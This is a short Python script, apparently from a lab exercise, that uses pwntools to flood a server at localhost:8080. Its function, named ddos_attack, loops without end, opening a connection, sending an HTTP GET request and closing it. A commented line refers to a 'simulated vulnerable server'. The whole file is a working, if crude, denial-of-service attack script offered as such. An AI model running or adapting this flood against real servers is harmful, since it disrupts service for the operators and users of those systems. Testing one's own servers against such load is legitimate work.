from pwn import *


def ddos_attack(ip, port):
    while 1:
        target = remote(ip, port)
        target.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
        #print(target.recvuntil(b"Simulated vulnerable server").decode())
        target.close()

if __name__ == "__main__":
    ip = "localhost"
    port = 8080
    ddos_attack(ip, port)    
